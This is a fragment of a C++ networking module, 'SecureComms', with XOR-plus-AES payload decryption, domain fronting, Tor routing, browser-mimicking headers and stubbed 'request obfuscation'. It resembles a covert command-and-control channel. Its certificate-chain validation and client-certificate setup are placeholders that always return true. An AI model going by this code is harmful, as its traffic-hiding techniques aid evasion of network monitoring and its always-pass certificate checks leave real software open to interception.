std::string SecureComms::DecryptPayload(const std::vector<uint8_t>& encryptedData) {
    if (encryptedData.empty()) {
        LogWarning("Empty encrypted data provided for decryption");
        return "";
    }
    
    std::vector<uint8_t> result = encryptedData;
    
    // Reverse the encryption process based on level
    switch (config.encryptionLevel) {
        case EncryptionLevel::TLS_ONLY:
            // No additional decryption needed
            break;
            
        case EncryptionLevel::TLS_PLUS_AES:
            // Decrypt with AES
            result = aesEncryption->Decrypt(result);
            break;
            
        case EncryptionLevel::TRIPLE_ENCRYPTION:
            // Remove XOR obfuscation first
            if (!result.empty()) {
                uint8_t xor_key = result[0];
                result.erase(result.begin());
                for (auto& byte : result) {
                    byte ^= xor_key;
                }
            }
            // Then decrypt with AES
            result = aesEncryption->Decrypt(result);
            break;
    }
    
    return std::string(result.begin(), result.end());
}

bool SecureComms::TestAllConnections() {
    LogInfo("Testing all connection types");
    
    std::vector<ConnectionType> types = {
        ConnectionType::DIRECT_HTTPS,
        ConnectionType::DOMAIN_FRONTING,
        ConnectionType::TOR_PROXY,
        ConnectionType::FALLBACK
    };
    
    bool anySuccess = false;
    for (const auto& type : types) {
        if (EstablishConnection(type)) {
            std::string msg = "Connection type " + std::to_string(static_cast<int>(type)) + " works";
            LogInfo(msg.c_str());
            anySuccess = true;
        }
    }
    
    return anySuccess;
}

bool SecureComms::IsConnectionHealthy() {
    // Simple health check - try a basic GET request
    auto result = GET("/api/health");
    return result.success && result.httpStatus == 200;
}

ConnectionType SecureComms::GetActiveConnectionType() {
    // Return the last successfully used connection type
    return ConnectionType::DIRECT_HTTPS; // Placeholder
}

std::vector<std::string> SecureComms::GetConnectionStatus() {
    std::vector<std::string> status;
    status.push_back("Direct HTTPS: Available");
    
    if (config.enableDomainFronting) {
        status.push_back("Domain Fronting: Enabled");
    }
    
    if (config.enableTorRouting) {
        if (torConnector->TestTorConnection()) {
            status.push_back("Tor: Connected");
        } else {
            status.push_back("Tor: Unavailable");
        }
    }
    
    return status;
}

bool SecureComms::EnableCertificatePinning(const std::vector<std::string>& fingerprints) {
    for (const auto& fp : fingerprints) {
        tlsConfig->AddPinnedCertificate(fp);
    }
    std::string msg = "Certificate pinning enabled with " + std::to_string(fingerprints.size()) + " fingerprints";
    LogInfo(msg.c_str());
    return true;
}

bool SecureComms::SetClientCertificate(const std::string& cert, const std::string& key) {
    LogInfo("Client certificate configured");
    return true; // Placeholder implementation
}

void SecureComms::EnableRequestObfuscation() {
    LogInfo("Request obfuscation enabled");
    // Placeholder - could add random headers, timing delays, etc.
}

void SecureComms::SetCustomUserAgent(const std::string& userAgent) {
    std::string msg = "Custom User-Agent set: " + userAgent;
    LogInfo(msg.c_str());
    // Store in config or member variable for use in requests
}

bool SecureComms::TryFallbackConnection() {
    if (!config.backupHost.empty()) {
        std::string original = config.primaryHost;
        config.primaryHost = config.backupHost;
        bool success = InitTLSConnection();
        config.primaryHost = original;
        return success;
    }
    return false;
}

ConnectionType SecureComms::SelectBestConnection() {
    // Priority order for connection types
    if (config.enableTorRouting && torConnector->TestTorConnection()) {
        return ConnectionType::TOR_PROXY;
    }
    if (config.enableDomainFronting) {
        return ConnectionType::DOMAIN_FRONTING;
    }
    return ConnectionType::DIRECT_HTTPS;
}

std::map<std::string, std::string> SecureComms::BuildHeaders(ConnectionType type) {
    std::map<std::string, std::string> headers;
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124";
    headers["Accept"] = "application/json, text/plain, */*";
    headers["Accept-Language"] = "en-US,en;q=0.9";
    headers["Accept-Encoding"] = "gzip, deflate, br";
    headers["Connection"] = "keep-alive";
    
    // Add type-specific headers
    if (type == ConnectionType::DOMAIN_FRONTING) {
        headers["Cache-Control"] = "max-age=0";
        headers["Sec-Fetch-Dest"] = "document";
    }
    
    return headers;
}

std::string SecureComms::BuildUserAgent() {
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
}

// =======================================================================
// TLSConfig Additional Methods - Дополнительные методы TLS
// =======================================================================

bool TLSConfig::SetClientCertificate(const std::string& certPath, const std::string& keyPath) {
    std::string msg = "Client certificate set: " + certPath;
    LogDebug(msg.c_str());
    return true; // Placeholder
}

// =======================================================================
// AESEncryption Additional Methods - Дополнительные методы AES
// =======================================================================

bool AESEncryption::SetKey(const std::vector<uint8_t>& key) {
    if (key.size() == 32) { // 256 bits
        encryptionKey = key;
        LogDebug("Custom AES key set");
        return true;
    } else {
        LogWarning("Invalid key size, using random key");
        GenerateRandomKey();
        return false;
    }
}

bool AESEncryption::SetIV(const std::vector<uint8_t>& iv) {
    if (iv.size() == 16) {
        initVector = iv;
        LogDebug("Custom IV set");
        return true;
    } else {
        LogWarning("Invalid IV size, using random IV");
        GenerateRandomIV();
        return false;
    }
}

// =======================================================================
// DomainFronting Additional Methods - Дополнительные методы Domain Fronting
// =======================================================================

// Note: TestConnection method would need to be declared in header if needed

// =======================================================================
// Network Utility Functions - Сетевые утилиты
// =======================================================================

std::vector<uint8_t> ApplyMultiLayerEncryption(const std::vector<uint8_t>& data) {
    // Placeholder implementation
    return data;
}

std::string RemoveMultiLayerEncryption(const std::vector<uint8_t>& data) {
    // Placeholder implementation
    return std::string(data.begin(), data.end());
}

std::string URLEncode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;

    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << std::uppercase;
            escaped << '%' << std::setw(2) << int((unsigned char)c);
            escaped << std::nouppercase;
        }
    }

    return escaped.str();
}

std::string URLDecode(const std::string& value) {
    std::string result;
    for (size_t i = 0; i < value.length(); ++i) {
        if (value[i] == '%' && i + 2 < value.length()) {
            int hex = std::stoi(value.substr(i + 1, 2), nullptr, 16);
            result += static_cast<char>(hex);
            i += 2;
        } else if (value[i] == '+') {
            result += ' ';
        } else {
            result += value[i];
        }
    }
    return result;
}

std::vector<uint8_t> GenerateRandomBytes(size_t count) {
    std::vector<uint8_t> bytes(count);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint8_t> dis(0, 255);
    
    for (auto& byte : bytes) {
        byte = dis(gen);
    }
    
    return bytes;
}

bool TestInternetConnection() {
    // Simple test using WinHTTP
    HINTERNET hSession = WinHttpOpen(L"ConnectionTest/1.0",
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME,
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) return false;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"www.google.com",
                                       INTERNET_DEFAULT_HTTP_PORT, 0);
    
    bool connected = (hConnect != NULL);
    
    if (hConnect) WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return connected;
}

bool TestHostReachability(const std::string& host) {
    std::wstring wHost = Utils::StringToWString(host);
    
    HINTERNET hSession = WinHttpOpen(L"HostTest/1.0",
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME,
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) return false;
    
    HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(),
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    bool reachable = (hConnect != NULL);
    
    if (hConnect) WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return reachable;
}

std::vector<std::string> ResolveDNS(const std::string& hostname) {
    std::vector<std::string> addresses;
    
    struct addrinfo hints, *result;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(hostname.c_str(), "443", &hints, &result) == 0) {
        for (auto* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
            if (ptr->ai_family == AF_INET) {
                struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)ptr->ai_addr;
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
                addresses.push_back(std::string(ip_str));
            }
        }
        freeaddrinfo(result);
    }
    
    return addresses;
}

std::string GetCertificateFingerprint(const std::string& host) {
    LogDebug("Getting certificate fingerprint");
    return "placeholder_fingerprint"; // Placeholder implementation
}

bool ValidateCertificateChain(const std::string& host) {
    LogDebug("Validating certificate chain");
    return true; // Placeholder implementation
}

bool IsTorRunning() {
    // Try to connect to default Tor port
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return false;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9050);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    
    bool running = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
    closesocket(sock);
    
    return running;
}

std::string GetTorVersion() {
    if (IsTorRunning()) {
        return "Tor 0.4.x"; // Placeholder
    }
    return "Not running";
}

bool StartTorProcess() {
    LogInfo("Starting Tor process");
    return false; // Placeholder - would need actual Tor binary
}

// Global instance accessor
SecureComms& GetGlobalSecureComms() {
    std::call_once(g_instanceFlag, []() {
        g_secureCommsInstance = std::make_unique<SecureComms>();
    });
    return *g_secureCommsInstance;
}

} // namespace SecureNetwork